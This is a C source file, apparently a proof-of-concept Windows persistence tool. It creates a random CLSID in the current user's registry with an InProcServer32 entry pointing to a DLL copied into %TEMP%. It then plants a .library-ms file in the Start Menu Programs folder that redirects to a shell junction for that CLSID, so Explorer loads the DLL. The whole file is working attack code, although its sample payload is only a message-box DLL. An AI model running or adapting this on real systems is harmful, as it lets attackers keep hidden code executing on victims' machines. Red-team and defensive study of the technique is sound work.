#include "payload.h"
// Function to generate a pseudo-random GUID using system time and tick count
void GenerateRandomGUID(char *guid_str, size_t size)
{

    // Generate pseudo-random GUID components
    unsigned int Data1 = GetTickCount();
    unsigned short Data2 = (unsigned short)(GetTickCount() % 0xFFFF);
    unsigned short Data3 = (unsigned short)(GetTickCount() & 0xFFFF);
    unsigned short Data4 = (unsigned short)(GetTickCount() % 0xFFFF);
    unsigned long long Data5;

    // Format the GUID as {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
    snprintf(guid_str, size, "{%08X-%04X-%04X-%04X-%012llX}", Data1, Data2, Data3, Data4, Data5);
}

BOOL CreateCLSIDRegistryEntry(char *guid_str, LPCSTR DllPath)
{
    char subKeyPath[256] = {0};
    char regPath[256] = {0};
    HKEY hKey = NULL, hSubKeyInProc = NULL, hSubKeyShell = NULL;
    DWORD ShellAttributes = 0xf090013d;
    BOOL ret = FALSE;
    do
    {
        snprintf(regPath, sizeof(regPath), "Software\\Classes\\CLSID\\%s", guid_str);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        {
            printf("Failed to create registry key: %s\n", regPath);
            break;
        }

        snprintf(subKeyPath, sizeof(subKeyPath), "%s\\InProcServer32", regPath);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, subKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hSubKeyInProc, NULL) == ERROR_SUCCESS)
        {
            RegSetValueExA(hSubKeyInProc, NULL, 0, REG_SZ, (BYTE *)DllPath, (DWORD)(lstrlenA(DllPath) + 1));
            RegSetValueExA(hSubKeyInProc, "ThreadingModel", 0, REG_SZ, (BYTE *)"Apartment", sizeof("Apartment"));
        }
        else
        {
            printf("Failed to create InProcServer32 subkey\n");
            break;
        }

        snprintf(subKeyPath, sizeof(subKeyPath), "%s\\ShellFolder", regPath);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, subKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hSubKeyShell, NULL) == ERROR_SUCCESS)
        {
            RegSetValueExA(hSubKeyShell, "Attributes", 0, REG_DWORD, (BYTE *)&ShellAttributes, sizeof(ShellAttributes));
        }
        else
        {
            printf("Failed to create ShellFolder subkey\n");
            break;
        }

        printf("New CLSID created: %s\n", guid_str);
        ret = TRUE;
    } while (0);

    if (hKey != NULL && hKey != INVALID_HANDLE_VALUE)
    {
        RegCloseKey(hKey);
    }
    if (hSubKeyInProc != NULL && hSubKeyInProc != INVALID_HANDLE_VALUE)
    {
        RegCloseKey(hSubKeyInProc);
    }

    return ret;
}

BOOL FindAndReplaceInFile(const char *filePath, const char *findStr, const char *replaceStr)
{
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open file for modification: %s\n", filePath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0)
    {
        printf("Invalid file size.\n");
        CloseHandle(hFile);
        return FALSE;
    }

    char *buffer = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
    if (!buffer)
    {
        printf("Memory allocation failed.\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    buffer[fileSize] = '\0';

    char *pos = strstr(buffer, findStr);
    if (pos)
    {
        // Calculate new file size
        size_t newSize = fileSize - lstrlenA(findStr) + lstrlenA(replaceStr);
        char *newBuffer = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newSize + 1);
        if (!newBuffer)
        {
            printf("Memory allocation for new buffer failed.\n");
            HeapFree(GetProcessHeap(), 0, buffer);
            CloseHandle(hFile);
            return FALSE;
        }

        lstrcpynA(newBuffer, buffer, pos - buffer + 1);
        lstrcatA(newBuffer, replaceStr);
        lstrcatA(newBuffer, pos + lstrlenA(findStr));

        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        DWORD bytesWritten;
        WriteFile(hFile, newBuffer, (DWORD)lstrlenA(newBuffer), &bytesWritten, NULL);
        SetEndOfFile(hFile);

        HeapFree(GetProcessHeap(), 0, newBuffer);
    }

    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hFile);
    return TRUE;
}

void CreateLibraryChain(const char *junction_path, const char *library_file_name)
{
    char src_path[MAX_PATH] = {0};
    char dest_path[MAX_PATH] = {0};
    char app_data[MAX_PATH] = {0};

    ExpandEnvironmentStringsA("%Public%\\Libraries\\RecordedTV.library-ms", src_path, MAX_PATH);

    ExpandEnvironmentStringsA("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs", app_data, MAX_PATH);
    sprintf(dest_path, "%s\\%s.library-ms", app_data, library_file_name);

    if (!CopyFileA(src_path, dest_path, FALSE))
    {
        printf("Failed to copy file. Error: %lu\n", GetLastError());
        return;
    }

    if (!FindAndReplaceInFile(dest_path, "shell:public\\Recorded TV", junction_path))
    {
        printf("Failed to modify file contents.\n");
    }
    return;
}

BOOL CopyPayload(char *payload_path)
{
    char current_payload[MAX_PATH] = {0};

    GetModuleFileNameA(NULL, current_payload, MAX_PATH);
    char *end_path = strrchr(current_payload, '\\');
    if (end_path == NULL)
    {
        printf("unable to get current payload path!");
        return FALSE;
    }

    *end_path = '\0';
    lstrcatA(current_payload, "\\msgbox.dll");

    if (!CopyFileA(current_payload, payload_path, FALSE) && GetLastError() != ERROR_ALREADY_EXISTS)
    {
        printf("unable to copy payload\n");
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char *argv[])
{
    char guid_str[64] = {0};
    char junction_path[MAX_PATH] = {0};
    char temp_path[MAX_PATH] = {0};
    char payload_path[MAX_PATH] = {0};
    DWORD nWrite = 0;

    ExpandEnvironmentStringsA("%TEMP%", temp_path, MAX_PATH);
    GenerateRandomGUID(guid_str, sizeof(guid_str));

    snprintf(payload_path, sizeof(payload_path), "%s\\msgbox.dll", temp_path);
    snprintf(junction_path, sizeof(junction_path), "shell:::%s", guid_str);

    if (CreateCLSIDRegistryEntry(guid_str, payload_path) && CopyPayload(payload_path))
    {
        CreateLibraryChain(junction_path, "Videos");
    }

    return 0;
}
